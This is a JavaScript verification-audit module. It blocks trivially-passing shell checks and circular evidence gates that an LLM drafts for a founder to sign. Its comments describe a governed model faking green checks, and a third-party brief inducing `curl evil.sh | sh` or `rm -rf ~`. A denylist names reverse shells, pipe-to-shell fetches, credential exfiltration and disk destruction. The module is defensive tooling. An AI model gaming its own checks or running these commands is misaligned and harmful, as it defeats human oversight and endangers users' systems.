// Verification audit (RED_TEAM round 1 — the "green-gate theater" defense).
//
// The core promise is "no unverified output ships." Its weakest point: the
// automated checks are drafted by the same LLM being governed, and a non-technical
// founder cannot read a shell command to tell a real check from a fake one. A model
// could satisfy a criterion with `command: "true"` — the gate goes green, nothing
// was verified.
//
// This module does two things, both at LOCK time (before the founder signs):
//   1. REFUSE to lock a contract containing a trivially-passing command check.
//      A hard denylist of no-op commands that pass regardless of the product.
//   2. Render every automated check into one plain-language sentence, so the
//      founder confirms WHAT is being verified, not just that something is.
//
// This does not make verification perfect — a determined model could still write a
// check that passes without proving the criterion. It removes the trivial cases and
// forces the rest into the open. The README states this limit honestly.

// Commands that pass no matter what the product does. Locking one is a defect.
const NOOP_PATTERNS = [
  /^\s*true\s*$/,
  /^\s*:\s*$/,               // shell no-op
  /^\s*exit\s+0\s*$/,
  /^\s*echo\b/,              // echo always exits 0; proves nothing
  /^\s*printf\b/,
  /^\s*#/,                   // a comment
  /^\s*$/,                   // empty
  /^\s*\/bin\/true\s*$/,
  /^\s*(true|:)\s*(#|;|$)/,  // `true`, `true;`, `true # comment` — no-op with trailing junk (NOT `true && realcheck`)
  // Tautologies and side-effect-free commands that always succeed (RED_TEAM round 5).
  /^\s*test\s+(.+)\s+(=|-eq)\s+\1\s*$/,   // test X = X
  /^\s*\[\s+.*\s+\]\s*$/,                  // [ ... ] constant test (e.g. [ -d . ], [ 1 = 1 ])
  /^\s*sleep\s+[\d.]+\s*$/,               // sleep proves nothing
  /^\s*(date|pwd|whoami|hostname|uptime|cd\s+\S+|dirname\s+\S+|basename\s+\S+)\s*$/
];

// Constructs that make a compound command pass even if the real work fails.
const ALWAYS_PASS_TAIL = [
  /\|\|\s*true\s*$/,         // `… || true`  swallows failure
  /\|\|\s*exit\s+0\s*$/,
  /;\s*true\s*$/,
  /;\s*exit\s+0\s*$/
];

// Destructive / exfiltrating command patterns (RED_TEAM round 2). A verification check
// is authored by an LLM and signed by a founder who cannot read shell. A brief sourced
// from a third party could induce a check like `curl evil.sh | sh` or `rm -rf ~`, which
// then runs on `signet gates` — RCE by design. These patterns are refused at lock time
// AND at execution time (so cloning a repo and running its gates is also protected).
// This is a denylist, not a sandbox: it raises the bar materially; it is not airtight.
// The airtight answer is running checks in a container — a v1.x task, disclosed in README.
const DANGEROUS_PATTERNS = [
  { re: /\brm\s+(-[a-z]*\s+)*(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)\b/i, why: 'recursive force delete' },
  { re: /\brm\b[^\n]*\s--?(r|recursive|R)\b[^\n]*\s--?(f|force)\b/i, why: 'recursive force delete (long/separated flags)' },
  { re: /\brm\b[^\n]*\s--?(f|force)\b[^\n]*\s--?(r|recursive|R)\b/i, why: 'recursive force delete (long/separated flags)' },
  { re: /\brm\s+-[a-z]*R[a-z]*\b/, why: 'recursive delete (-R)' },
  { re: /\bfind\b[^\n]*\s-delete\b/i, why: 'mass deletion via find -delete' },
  { re: /\bfind\b[^\n]*-exec\b[^\n]*\b(rm|unlink|shred)\b/i, why: 'find -exec destructive command' },
  { re: /\brm\s+-[rf]\b.*(\/(\s|$)|~|\$HOME)/i, why: 'delete of home or root' },
  { re: /\bmkfs\b|\bdd\s+if=|\bshred\b/i, why: 'disk / filesystem destruction' },
  { re: /:\s*\(\s*\)\s*\{.*\|.*&\s*\}\s*;/, why: 'fork bomb' },
  { re: /\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|python|node|perl|ruby)\b/i, why: 'pipe remote content into an interpreter (remote code execution)' },
  { re: /\b(sh|bash|zsh)\s+-c\b[^\n]*\b(curl|wget)\b/i, why: 'shell fetch-and-run' },
  { re: /\bbase64\s+-d[^\n|]*\|\s*(sh|bash|python|node)\b/i, why: 'decode-and-execute obfuscated payload' },
  { re: />\s*\/dev\/(sd|nvme|disk)/i, why: 'raw write to a block device' },
  { re: /\bchmod\s+-R\s+0*777\s+\//, why: 'world-writable root' },
  { re: /\b(nc|ncat|netcat)\b[^\n]*\s-e\b/i, why: 'reverse shell' },
  { re: /\/dev\/(tcp|udp)\/i/, why: 'reverse shell / network redirection via /dev/tcp' },
  { re: /\bcrontab\b|\bsystemctl\b|\blaunchctl\b/i, why: 'persistence / service manipulation' },
  { re: /\bgit\s+push\b|\bnpm\s+publish\b|\bgh\s+(repo|release)\b/i, why: 'network side effect (push/publish) — a check must be read-only' },
  { re: /\b(ssh|scp|rsync)\b.*@/i, why: 'remote host access' },
  { re: /\bexport\b[^\n]*\b(KEY|TOKEN|SECRET|PASSWORD)\b[^\n|]*\|\s*(curl|wget|nc)\b/i, why: 'credential exfiltration' }
];

export function isDangerousCommand(cmd) {
  const c = String(cmd ?? '');
  for (const p of DANGEROUS_PATTERNS) if (p.re.test(c)) return p.why;
  return null;
}

export function isTrivialCommand(cmd) {
  const c = String(cmd ?? '');
  if (NOOP_PATTERNS.some((r) => r.test(c))) return true;
  if (ALWAYS_PASS_TAIL.some((r) => r.test(c))) return true;
  return false;
}

// Ledger events the engine emits automatically as a side effect of running the build/gate
// loop. Using one as an `evidence` criterion is circular theater — the act of running an
// increment makes it present, so the gate can never fail and verifies nothing about the
// product (RED_TEAM round 5). `contract.locked` is deliberately EXCLUDED: it is a genuine
// provenance milestone (proves a contract was sealed), which is a legitimate — if minimal —
// thing to assert, and the genesis dogfood relies on it.
const CIRCULAR_EVIDENCE_EVENTS = new Set([
  'build.increment', 'gate.pass', 'gate.fail', 'budget.spend', 'budget.cap_hit',
  'decision.requested', 'decision.made', 'drift.rejected', 'note',
  'interrogation.started', 'interrogation.question', 'interrogation.answer', 'interrogation.drafted'
]);

export function isCircularEvidence(eventType) {
  return CIRCULAR_EVIDENCE_EVENTS.has(String(eventType ?? ''));
}

/** Plain-language, founder-readable description of what a verification actually does. */
export function describeVerification(v) {
  if (!v) return 'no verification — this criterion cannot be checked';
  if (v.type === 'human_decision') return `you decide: “${v.prompt}”`;
  if (v.type === 'evidence') return `the engine's own record must contain a “${v.event_type}” event`;
  if (v.type === 'automated') {
    if (v.check.kind === 'command') return `a check runs the command: \`${v.check.command}\` and it must succeed`;
    if (v.check.kind === 'file_exists') return `the file “${v.check.path}” must exist`;
    if (v.check.kind === 'file_absent') return `the file “${v.check.path}” must NOT exist`;
  }
  return 'unrecognized verification';
}

/**
 * Audit a contract's acceptance criteria before locking.
 * Returns { ok, blocking[], plain[] }.
 *   blocking[] — trivially-passing checks; locking must be refused.
 *   plain[]    — { id, statement, description } for founder confirmation.
 */
export function auditVerifications(contract) {
  const blocking = [];
  const plain = [];
  for (const c of contract.acceptance_criteria ?? []) {
    plain.push({ id: c.id, statement: c.statement, description: describeVerification(c.verification) });
    const v = c.verification;
    if (v?.type === 'automated' && v.check?.kind === 'command') {
      const danger = isDangerousCommand(v.check.command);
      if (danger) {
        blocking.push({ id: c.id, command: v.check.command, reason: `destructive/unsafe command (${danger}) — a verification check must be read-only and safe` });
      } else if (isTrivialCommand(v.check.command)) {
        blocking.push({ id: c.id, command: v.check.command, reason: 'command passes regardless of the product — it verifies nothing' });
      }
    } else if (v?.type === 'evidence' && isCircularEvidence(v.event_type)) {
      // The audit is no longer command-only (RED_TEAM round 5): a circular evidence gate is
      // auto-green the instant the loop runs, so it is refused at lock just like a no-op command.
      blocking.push({ id: c.id, command: `evidence:${v.event_type}`, reason: `“${v.event_type}” is emitted automatically by the build loop — this gate is always green and verifies nothing` });
    }
  }
  return { ok: blocking.length === 0, blocking, plain };
}